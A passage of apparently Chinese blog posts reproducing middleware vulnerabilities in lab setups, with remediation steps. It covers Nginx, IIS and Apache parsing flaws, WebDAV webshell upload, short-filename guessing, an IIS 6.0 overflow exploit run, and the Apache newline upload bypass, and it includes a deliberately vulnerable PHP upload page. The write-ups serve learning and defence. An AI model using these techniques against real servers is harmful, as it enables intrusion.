src="https://bbsmax.ikafan.com/static/L3Byb3h5L2h0dHBzL2ltZzIwMTguY25ibG9ncy5jb20vYmxvZy8xNjc0NDYzLzIwMTkwOS8xNjc0NDYzLTIwMTkwOTE5MjExNzEzMzI0LTIwNzE4NzEyOTgucG5n.jpg" alt="img"></p><p>执行几条命令看看； root权限</p><p><img src="https://bbsmax.ikafan.com/static/L3Byb3h5L2h0dHBzL2ltZzIwMTguY25ibG9ncy5jb20vYmxvZy8xNjc0NDYzLzIwMTkwOS8xNjc0NDYzLTIwMTkwOTE5MjExNzIxMzA2LTUzNzY3MDMxMy5wbmc=.jpg" alt="img"></p><h5 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h5><p><a href="https://www.bbsmax.com/A/WpdK3MwrdV/" target="_blank" rel="noopener">https://www.bbsmax.com/A/WpdK3MwrdV/</a></p><p><a href="https://www.bbsmax.com/A/WpdK3MwrdV/" target="_blank" rel="noopener">https://www.bbsmax.com/A/WpdK3MwrdV/</a></p><p><a href="https://www.freebuf.com/articles/web/192063.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/192063.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 中间件漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JBoss中间件漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nginx中间件漏洞</title>
      <link href="/2020/04/03/nginx-zhong-jian-jian-lou-dong/"/>
      <url>/2020/04/03/nginx-zhong-jian-jian-lou-dong/</url>
      
        <content type="html"><![CDATA[<h2 id="Nginx-系列漏洞复现"><a href="#Nginx-系列漏洞复现" class="headerlink" title="Nginx -系列漏洞复现"></a><strong>Nginx -系列漏洞复现</strong></h2><p>IIS是微软开发的web服务器，需要收费，主要用来跑asp.net asp php，只能在windows下运行。</p><p>Apache是Apache基金会的web服务器，免费，只支持静态界面，是html容器，应用范围广泛。</p><p>Tomcat是Apache基金会的java服务器，主要用来跑jsp php python等</p><p>Ngnix是反向代理服务器，它是代理，本身并不执行，是个传话筒，把用户提交的请求转发给web服务器，再把web服务器的结果转发给用户。为了提高性能，启用反向代理，实际的web服务器可以有很多台，而Ngnix放在前面，可以把这些web服务器整合成一个虚拟的更强大的服务</p><h4 id="Nginx-文件解析漏洞"><a href="#Nginx-文件解析漏洞" class="headerlink" title="Nginx-文件解析漏洞"></a>Nginx-文件解析漏洞</h4><h5 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h5><p>​          nginx是一款高性能的web服务器，使用非常广泛，其不仅经常被用作反向代理，也可以非常好的支持PHP的运行。80sec发现其中存在一个较为严重的安全问题，默认情况下可能导致服务器错误的将任何类型的文件以PHP的方式进行解析，这将导致严重的安全问题，使得恶意的攻击者可能攻陷支持php的nginx服务器。<br>​          漏洞格式：test.jpg/a.php</p><h5 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h5><p>我们首先打开phpstudy切换版本为nginx-5.2.17</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200131115008.png" alt=""></p><p>我们可以从phpstudy下的nginx的index.html复制到网站根目录下</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200131115049.png" alt=""></p><p>我们从本地打开网站的该页面即可看到nginx的欢迎页面</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200131115112.png" alt=""></p><p>我们在C盘根目录下新建shell.php写入如下代码。然后任意选择一张图片。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200131115532.png" alt=""></p><p>我们在命令行下选择使用管理员打开命令行，然后使用copy命令制作图片马。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200131120017.png" alt=""></p><p><img src="QQ%E6%88%AA%E5%9B%BE20200131120033.png" alt=""></p><p>然后我们在本地网站根目录下创建文件上传页面。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200131121704.png" alt=""></p><img src="QQ截图20200131121729.png" style="zoom:50%;" /><img src="QQ截图20200131121803.png" style="zoom:50%;" /><p>我们将我们刚刚制作好的图片马进行上传，发现提示上传成功。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200131122629.png" alt=""></p><p>我们在本地网站根目录下进行查看</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200131122944.png" alt=""></p><img src="QQ截图20200131123013.png" style="zoom:67%;" /><p>我们在shell.jpg后添加/a.php或/b.php后发现可以成功解析。</p><img src="QQ截图20200131123036.png" style="zoom:67%;" /><h5 id="漏洞防御"><a href="#漏洞防御" class="headerlink" title="漏洞防御"></a>漏洞防御</h5><p> 将php.ini文件中的cgi.fix_pathinfo的值设为0，这样php在解析1.php/1.jpg这样的目录时，只要1.jpg不存在就会显示404.</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200131123518.png" alt=""></p><h4 id="nginx-目录遍历漏洞"><a href="#nginx-目录遍历漏洞" class="headerlink" title="nginx-目录遍历漏洞"></a>nginx-目录遍历漏洞</h4><h5 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h5><p>​       目录遍历（路径遍历）是由于web服务器或者web应用程序对用户输入的文件名称的安全性验证不足而导致的一种安全漏洞。使得攻击者通过利用一些特殊字符就可以绕过服务器的安全限制，访问任意的文件（可以是web根目录以外的文件），甚至执行系统命令。</p><p>​      程序在实现上没有充分过滤用户输入的../之类的目录跳转符，导致恶意用户可以通过提交目录跳转来遍历服务器上的任意文件。</p><h5 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h5><p>我们首先需要将nginx的配置文件nginx.conf中autoindex off；改为on;</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200131182922.png" alt=""></p><p>我们任意访问网站根目录下的某一文件夹，即可看到该目录下的所有文件，出现目录遍历漏洞。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200131183226.png" alt=""></p><h5 id="漏洞防御-1"><a href="#漏洞防御-1" class="headerlink" title="漏洞防御"></a>漏洞防御</h5><p>将nginx的配置文件nginx.conf下改为autoindex   off即可；</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200131182922.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 中间件漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> nginx学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IIS中间件漏洞</title>
      <link href="/2020/04/03/iis-zhong-jian-jian-lou-dong/"/>
      <url>/2020/04/03/iis-zhong-jian-jian-lou-dong/</url>
      
        <content type="html"><![CDATA[<h2 id="IIS中间件漏洞复现"><a href="#IIS中间件漏洞复现" class="headerlink" title="IIS中间件漏洞复现"></a>IIS中间件漏洞复现</h2><h4 id="IIS-put漏洞"><a href="#IIS-put漏洞" class="headerlink" title="IIS-put漏洞"></a>IIS-put漏洞</h4><p><strong>什么是IIS？</strong></p><p>  IIS是一种Web（网页）服务组件，其中包括Web服务器、FTP服务器、NNTP服务器和SMTP服务器，分别用于网页浏览、文件传输、新闻服务和邮件发送等方面，它使得在网络（包括互联网和局域网）上发布信息成了一件很容易的事。</p><h5 id="漏洞原理："><a href="#漏洞原理：" class="headerlink" title="漏洞原理："></a>漏洞原理：</h5><p>​      WebDAV （Web-based Distributed Authoring and Versioning） 是一种HTTP1.1的扩展协议。它扩展了HTTP 1.1，在GET、POST、HEAD等几个HTTP标准方法以外添加了一些新的方法，使应用程序可对Web Server直接读写，并支持写文件锁定(Locking)及解锁(Unlock)，还可以支持文件的版本控制。可以像在操作本地文件夹一样操作服务器上的文件夹，该扩展也存在缺陷，可以被恶意攻击者利用，直接上传恶意文件。</p><h5 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h5><p>1.准备过程：</p><p>安装windows server 2003版本，准备iis写入工具，下载IIS6.0版本</p><p>2.复现过程：</p><p>我们首先在虚拟机中打开win server 2003 版本。</p><img src="QQ截图20200118185950.png" style="zoom:50%;" /><p>之后我们安装IIS6.0服务,进入网站配置界面</p><img src="QQ截图20200118190925.png" style="zoom:50%;" /><p>打开webDAV服务配置  Active Server pages(允许解析asp文件)，提供文件写入权限。</p><img src="QQ截图20200118191122.png" style="zoom:33%;" /><img src="QQ截图20200118191318.png" style="zoom: 50%;" /><p>我们尝试在物理机打开网站</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200118191510.png" alt=""></p><p>说明服务已开启。</p><p>我们打开iis写入工具。尝试写入test.txt文件。</p><img src="QQ截图20200118192007.png" style="zoom:50%;" /><p>发现提示“您未被授予查看该页”。</p><p>后来发现未开启来宾用户足够的权限</p><img src="QQ截图20200118192257.png" style="zoom:50%;" /><p>我们再次尝试。成功写入。</p><img src="QQ截图20200118192408.png" style="zoom:50%;" /><img src="QQ截图20200118192500.png" style="zoom:50%;" /><p>我们新建一个asp一句话木马文件，先命名为shell.txt,写入网站根目录下。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200118193312.png" alt=""></p><p>然后使用iiswrite的mv功能。首先我们需开启网站主目录下的脚本资源访问功能</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200118112701.png" alt=""></p><p>然后将根目录下的shell.txt修改为shell.asp</p><img src="QQ截图20200118112855.png" style="zoom: 80%;" /><p>之后我们使用菜刀连接即可。</p><h4 id="IIS-短文件名猜解漏洞"><a href="#IIS-短文件名猜解漏洞" class="headerlink" title="IIS-短文件名猜解漏洞"></a>IIS-短文件名猜解漏洞</h4><p><strong>什么是短文件名？</strong></p><p>为了兼容16位MS-DOS程序，Windows为文件名较长的文件(和文件夹)生成对应的window 8.3短文件名。</p><h5 id="漏洞原理：-1"><a href="#漏洞原理：-1" class="headerlink" title="漏洞原理："></a>漏洞原理：</h5><p>  为了兼容16位MS-DOS程序，Windows为文件名较长的文件（和文件夹）生成了对应的windows 8.3 短文件名。<br> 在Windows下查看对应的短文件名，可以使用命令 <code>dir /x</code></p><p>​     攻击者使用通配符*和？发送一个请求到IIS，当IIS接收到一个文件路径中包含“~”请求时，返回的HTTP状态码和错误信息不同。基于这个特点，可以根据HTTP的响应区分一个可用或者不可用的文件。访问构造的某个存在的短文件名，会返回404；访问构造的某个不存在的短文件名，会返回400（报错页面）。</p><h5 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h5><p>我们进入win server 2003的网站根目录下。</p><img src="QQ截图20200118194442.png" style="zoom:67%;" /><p>在根目录下新建多个超过8个字符的文件名</p><p>​                   <img src="QQ%E6%88%AA%E5%9B%BE20200118144312.png" alt=""></p><p>我们在命令提示符使用 dir c:/x，即可看到我们创建的文件的短文件名。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200118144400.png" alt=""></p><p>我们在物理机上访问该网站并使用通配符猜解文件名。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200202204523.png" alt=""></p><p>可以看到网页回显404，说明网站根目录存在所猜解的文件名。</p><img src="QQ截图20200202204745.png" style="zoom:67%;" /><p>我们访问不存在的文件会报错。</p><h5 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h5><ol><li>升级.net framework</li><li>修改注册表键值：</li></ol><p><img src="QQ%E6%88%AA%E5%9B%BE20200202205239.png" alt=""></p><p>将数值数据改为1，1代表不创建短文件名格式。修改完成后，需要重启系统生效。</p><h4 id="IIS-解析漏洞"><a href="#IIS-解析漏洞" class="headerlink" title="IIS-解析漏洞"></a>IIS-解析漏洞</h4><h5 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h5><p>在网站下建立文件夹的名称中以.asp或.asa等作为后缀的文件夹,其目录内任何扩展名的文件都被IIS当作asp可执行文件去解析并执行.</p><p>举例：/xx.asp/xx.jpg为xx.asp目录下存在xx.jpg文件,但将会被IIS解析成asp文件去执行,与原文件的后缀无关.</p><h5 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h5><p>我们在www下新建一个test.asp文件夹和test.jpg图像文件</p><p>在图像文件中写入任意字符。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200202210506.png" alt=""></p><p>我们直接访问图像文件，发现无法成功解析。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200202210532.png" alt=""></p><p>我们再将图片文件放入asp文件夹下重新尝试访问</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200202210636.png" alt=""></p><p>发现网站将该文件解析成了asp文件进而成功执行。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200202210706.png" alt=""></p><h5 id="漏洞修复-1"><a href="#漏洞修复-1" class="headerlink" title="漏洞修复"></a>漏洞修复</h5><ul><li>取消网站后台新建目录的功能，不允许新建目录。</li><li>对新建目录文件名进行过滤，不允许新建包含.的文件夹。</li></ul><h4 id="IIS远程代码执行"><a href="#IIS远程代码执行" class="headerlink" title="IIS远程代码执行"></a>IIS远程代码执行</h4><h5 id="漏洞原理：-2"><a href="#漏洞原理：-2" class="headerlink" title="漏洞原理："></a>漏洞原理：</h5><p>​    在IIS6.0处理PROPFIND指令的时候，由于对url的长度没有进行有效的长度控制和检查，导致执行memcpy对虚拟路径进行构造的时候，引发栈溢出，从而导致远程代码执行。</p><h5 id="漏洞复现："><a href="#漏洞复现：" class="headerlink" title="漏洞复现："></a>漏洞复现：</h5><p>1.漏洞环境搭建：</p><p>在windows server 2003 r2 32位上安装iis6.0</p><p>2.触发漏洞：</p><p>在本地执行exp</p><p><img src="4-2-1.png" alt=""></p><p>执行成功后，服务器弹出计算器。</p><p><img src="4-2-2.png" alt=""></p><h5 id="漏洞修复："><a href="#漏洞修复：" class="headerlink" title="漏洞修复："></a>漏洞修复：</h5><p>1.关闭webDAV服务</p><p>2.使用相关防护设备</p><h5 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h5><h5 id="https-www-secpulse-com-archives-82410-html"><a href="#https-www-secpulse-com-archives-82410-html" class="headerlink" title="https://www.secpulse.com/archives/82410.html"></a><a href="https://www.secpulse.com/archives/82410.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/82410.html</a></h5><p><a href="https://www.aqniu.com/learn/43996.html" target="_blank" rel="noopener">https://www.aqniu.com/learn/43996.html</a></p><p><a href="https://blog.csdn.net/weixin_45744757/article/details/104512683" target="_blank" rel="noopener">https://blog.csdn.net/weixin_45744757/article/details/104512683</a></p>]]></content>
      
      
      <categories>
          
          <category> 中间件漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IIS中间件漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Apache中间件漏洞学习</title>
      <link href="/2020/04/02/apachhe-zhong-jian-jian-lou-dong/"/>
      <url>/2020/04/02/apachhe-zhong-jian-jian-lou-dong/</url>
      
        <content type="html"><![CDATA[<h3 id="Apache中间件漏洞复现"><a href="#Apache中间件漏洞复现" class="headerlink" title="Apache中间件漏洞复现"></a>Apache中间件漏洞复现</h3><h4 id="关于apache"><a href="#关于apache" class="headerlink" title="关于apache"></a>关于apache</h4><h5 id="apache简介"><a href="#apache简介" class="headerlink" title="apache简介"></a>apache简介</h5><p>​       Apache HTTP Server（简称Apache）是Apache软件基金会的一个开放源码的网页服务器，可以在大多数计算机操作系统中运行，由于其多平台和安全性被广泛使用，是最流行的Web服务器端软件之一。它快速、可靠并且可通过简单的API扩展，将Perl/Python等解释器编译到服务器中。</p><h5 id="Apache的目录结构："><a href="#Apache的目录结构：" class="headerlink" title="Apache的目录结构："></a>Apache的目录结构：</h5><ul><li>bin——-存放常用的命令工具，例如httpd</li><li>cgi-bin—存放Linux下常用的命令，例如xxx.sh</li><li>conf——Linux的配置相关文件，例如httpd.conf</li><li>error—–错误记录</li><li>htdocs—-放网站源码</li><li>icons—–网站图标</li><li>logs——日志</li><li>modules—扩展模块</li><li>manual—-手册</li></ul><h5 id="apache原理介绍"><a href="#apache原理介绍" class="headerlink" title="apache原理介绍:"></a>apache原理介绍:</h5><p>要讲到的Apahce的漏洞必须要理解Apache的运行原理。</p><p><img src="v2-61e13c6df766e990c4e228d3222fee36_720w.jpg" alt=""></p><p>图中简易描述了Apahce与PHP配合完成了一次WEB请求，Apahce在前，PHP在后，那两者之间如何进行通信的呢？先了解下PHP的架构。如下图</p><p><img src="v2-7692da2f8367d3fff6ef09df67fba07a_720w.jpg" alt=""></p><ul><li>Zend Engine是PHP的底层实现，包含编译和执行，底层由C语言实现。</li><li>Zend API、Zend Extension API是基于Zend底层对外封装提供服务。</li><li>Extendions使用Extension API实现了扩展库、标准库，例如各种内置函数、MySQL连接库等</li><li>SAPI是重点，全称是Server Application Programming Interface，也就是服务端应用编程接口。PHP就是通过它来和Apache、Nginx、FastCGI交互</li><li>Application是最上层，也就是我们写的PHP代码了</li></ul><p>Apache本身是不支持PHP解析的,通过架构图我们可以知道是通过SAPI进行通信，那Apache如何和SAPI通信呢？Apache怎么知道什么类型的文件要解析为PHP？如果你手动搭建过Apache解析PHP的环境，就肯定了解这两个步骤：</p><pre><code># 加载php5_module模块LoadModule php5_module php5apache2_2.dll的路径# 添加可以执行php的文件类型，让.php文件类型解析为PHPAddType application/x-httpd-php .php# 或者将AddType变为下面的(在Apache 2.4.0~2.4.29中默认使用了该方式)&lt;FilesMatch \.php$&gt;    SetHandler application/x-httpd-php&lt;/FilesMatch&gt;以及&lt;IfModule dir_module&gt;DirectoryIndex index.html index.htm index.php index.phtml&lt;/IfModule&gt;</code></pre><p>​    Apache通过LoadModule来加载php5_module模块（php5apache2_2.dll），这样做的目的是让Apache加载php5_module模块来解析PHP文件。意思其实就是用LoadModule来加载php5_module。也就是把php作为Apache的一个子模块来运行。当通过Web访问php文件时，Apache就会调用php5_module来解析php代码。<br>调用过程可以概括为</p><pre><code>HTTP-&gt;Apahce-&gt;php5_module-&gt;sapi-&gt;php。</code></pre><h4 id="Apache-文件解析漏洞"><a href="#Apache-文件解析漏洞" class="headerlink" title="Apache 文件解析漏洞"></a>Apache 文件解析漏洞</h4><h5 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h5><p>​       Apache文件解析漏洞与用户的配置有密切关系，严格来说属于用户的配置问题。Apache文件解析漏洞涉及到一个解析文件的特性。Apache默认一个文件可以有多个以点分隔的后缀，当右边的后缀无法识别，则继续向左识别，发现后缀是php,交给php处理这个文件。</p><h5 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h5><p>我们首先打开phpstudy，切换apache版本为5.2.17.</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200201102616.png" alt=""></p><p>我们在本地网站根目录下新建文本文档写入任意字母。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200201104725.png" alt=""></p><p>我们尝试修改后缀名为不存在的.456，然后在本地访问该文件</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200201104035.png" alt=""></p><p><img src="QQ%E6%88%AA%E5%9B%BE20200201104057.png" alt=""></p><p>发现仍然可以成功读取</p><p>我们继续修改后缀名</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200201104123.png" alt=""></p><p><img src="QQ%E6%88%AA%E5%9B%BE20200201104141.png" alt=""></p><p>发现服务器仍然可以解析</p><p>我们修改为.php.360尝试，依然可以成功解析。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200201104210.png" alt=""></p><p><img src="QQ%E6%88%AA%E5%9B%BE20200201104231.png" alt=""></p><p>那么我们在文件上传时就可以利用Apache的解析特性进行绕过</p><h5 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h5><p>在httpd.conf或httpd-vhosts.conf中加入以下语句，从而禁止文件名格式为<em>.php.\</em>的访问权限：</p><pre class=" language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>FilesMatch</span> <span class="token attr-name">".(php.|php3.|php4|php5.)"</span><span class="token punctuation">></span></span></span>Order Deny<span class="token punctuation">,</span>AllowDeny from all<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>FilesMatch</span><span class="token punctuation">></span></span></span></code></pre><h4 id="Apache-目录遍历漏洞"><a href="#Apache-目录遍历漏洞" class="headerlink" title="Apache 目录遍历漏洞"></a>Apache 目录遍历漏洞</h4><h5 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h5><p> 目录遍历（路径遍历）是由于web服务器或者web应用程序对用户输入的文件名称的安全性验证不足而导致的一种安全漏洞。使得攻击者通过利用一些特殊字符就可以绕过服务器的安全限制，访问任意的文件（可以是web根目录以外的文件），甚至执行系统命令。</p><p>​      程序在实现上没有充分过滤用户输入的../之类的目录跳转符，导致恶意用户可以通过提交目录跳转来遍历服务器上的任意文件。</p><h5 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h5><p>我们打开phpstudy.</p><p>然后在本地网站根目录下新建多个子目录</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200201112807.png" alt=""></p><p>我们此时访问网站</p><p><img src="18d8bc3eb13533fa38aa502b974b3d1a41345b31.jpg" alt=""></p><p>可以看到很明显的index  of标志,说明此时存在目录遍历</p><p>我们可以在谷歌中通过 intitle ：index of来帮我们寻找目录遍历漏洞</p><h5 id="漏洞防御"><a href="#漏洞防御" class="headerlink" title="漏洞防御"></a>漏洞防御</h5><p>在httpd.conf文件中找到Options + Indexes + FollowSymLinks + ExecCGI并修改成</p><p>Options -Indexes + FollowSymLinks + ExecCGI并保存（把+修改为-）</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200201114345.png" alt=""></p><h4 id="Apache换行解析漏洞"><a href="#Apache换行解析漏洞" class="headerlink" title="Apache换行解析漏洞"></a>Apache换行解析漏洞</h4><p>转载：<a href="https://github.com/zhangzhenfeng/vulhub/tree/master/httpd/CVE-2017-15715" target="_blank" rel="noopener">https://github.com/zhangzhenfeng/vulhub/tree/master/httpd/CVE-2017-15715</a></p><p><strong>（我按该文章复现的以下两个漏洞，人懒就直接复制了。。。。）</strong></p><p><strong>影响版本</strong>：Apache 2.4.0~2.4.29</p><p><strong>影响说明</strong>：绕过服务器策略，上传webshell</p><p><strong>环境说明</strong>：PHP5.5 、 Apache2.4.10</p><p><strong>环境搭建</strong>：<br>此次环境使用docker环境搭建，环境采用地址<a href="https://link.zhihu.com/?target=https%3A//github.com/zhangzhenfeng/vulhub/tree/master/httpd/CVE-2017-15715">Vulhub</a>，环境文件有3个</p><ul><li>Dockerfile(apache环境)</li><li>docker-compose.yml（compose文件，在此环境中意义不大）</li><li>index.php（源文件缺少前台源码，已补全）</li></ul><p>执行构建环境命令如下（启动后在浏览器中访问<a href="https://link.zhihu.com/?target=http%3A//127.0.0.1%3A8080">http://127.0.0.1:8080</a>）</p><pre class=" language-bash"><code class="language-bash">docker-compose builddocker-compose up -d</code></pre><h5 id="漏洞原理："><a href="#漏洞原理：" class="headerlink" title="漏洞原理："></a>漏洞原理：</h5><p>Apache HTTPD是一款HTTP服务器，它可以通过mod_php来运行PHP网页。其2.4.0~2.4.29版本中存在一个解析漏洞，在解析PHP时，<code>1.php\x0A</code>将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。</p><h5 id="漏洞复现："><a href="#漏洞复现：" class="headerlink" title="漏洞复现："></a>漏洞复现：</h5><p>​        接下来通过实验的方式复现整个利用过程，首先先确认环境中的配置文件是否是&lt;FilesMatch .php$&gt;，路径为/etc/apache2/conf-available/docker-php.conf，该路径取决于apache2的目录，在搭建环境的时候不同apache版本路径可能不同，在Linux下的apache目录下执行grep -rn “FilesMatch” * 即可搜索到。<em>（在FilesMatch中的定义是将.php为后缀的文件解析为PHP，如果将其改为.(php|html)$的话，html中的php也会被解析。）</em><br>按照正常的漏洞利用步骤将其复现<br>0x01 抓包／改包<br>准备工作：将浏览器的代理打开、将burpsuit打开开启抓包。<br>访问漏洞页面<a href="https://link.zhihu.com/?target=http%3A//IP%3A8080/index.php">http://IP:8080/index.php</a>可以看到</p><p><img src="https://pic1.zhimg.com/80/v2-17a95fd0f1c3533df7c1ec56c642cfd8_720w.jpg" alt="img"></p><p>点击submit进行上传，burp可以抓到</p><p><img src="https://pic1.zhimg.com/80/v2-c3df365945893aa605e58927c377e110_720w.jpg" alt="img"></p><p>上图中最下面标红的地方是index.php代码中获取文件名的位置，但现在为空，需要填写上phpinfo.php1，后缀加1的目的是占位，下一步将1改为0x0a，点击上面红色箭头指向的Hex，将包修改为以下内容：</p><p><img src="https://pic2.zhimg.com/80/v2-844c604155e2bbdbfcdb51501261eb8d_720w.jpg" alt="img"></p><p>改完后将数据包给服务器，此时在浏览器中访问<a href="https://link.zhihu.com/?target=http%3A//IP%3A8080/phpinfo.php%0a">http://IP:8080/phpinfo.php%0a</a>便可以看到phpinfo的界面，说明利用成功。</p><p><strong>在Windows下的表现</strong><br>将漏洞代码复制到windows的环境中，进行访问、抓包（和文章中在Linux的方法一样），最终会出现以下问题：</p><p><img src="https://pic3.zhimg.com/80/v2-c5db07449b76d9786d7e0fc0a8daaca2_720w.png" alt="img"></p><p>根据上图可以发现，move_uploaded_file函数已经被执行了，说明我们绕过了黑名单的检测，只不过在windows创建文件的时候由于结尾是换行符，windows不允许，所以创建失败了。</p><p><strong>index.php源码</strong></p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token variable">$ext</span> <span class="token operator">=</span> <span class="token function">pathinfo</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span><span class="token constant">PATHINFO_EXTENSION</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$ext</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'php'</span><span class="token punctuation">,</span> <span class="token string">'php3'</span><span class="token punctuation">,</span> <span class="token string">'php4'</span><span class="token punctuation">,</span> <span class="token string">'php5'</span><span class="token punctuation">,</span> <span class="token string">'phtml'</span><span class="token punctuation">,</span> <span class="token string">'pht'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token string">'bad file'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'./'</span> <span class="token punctuation">.</span> <span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>index.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>name<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></span></code></pre><h4 id="Apache-SSI远程命令执行漏洞"><a href="#Apache-SSI远程命令执行漏洞" class="headerlink" title="Apache SSI远程命令执行漏洞"></a>Apache SSI远程命令执行漏洞</h4><p>转载：<a href="https://github.com/zhangzhenfeng/vulhub/tree/master/httpd/ssi-rce" target="_blank" 